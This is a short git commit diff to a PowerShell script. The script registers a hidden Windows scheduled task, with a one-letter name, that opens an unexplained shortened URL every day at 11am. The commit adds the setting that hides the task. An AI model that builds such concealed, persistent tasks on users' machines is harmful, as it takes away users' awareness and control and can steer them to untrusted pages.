44e02bb7c354d586f89c117d6539387a83d7b34a
Wouterr0 <41055533+Wouterr0@users.noreply.github.com>
2020-12-11 09:50:41 +0100

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,5 +1,4 @@
+$settings = New-ScheduledTaskSettingsSet -Hidden
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Start-Process https://bit.ly/34niz9I'
-
-$trigger = New-ScheduledTaskTrigger -Daily -At 11:00
-
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "c"
+$trigger = New-ScheduledTaskTrigger -Daily -At 11am
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'r' -Settings $settings
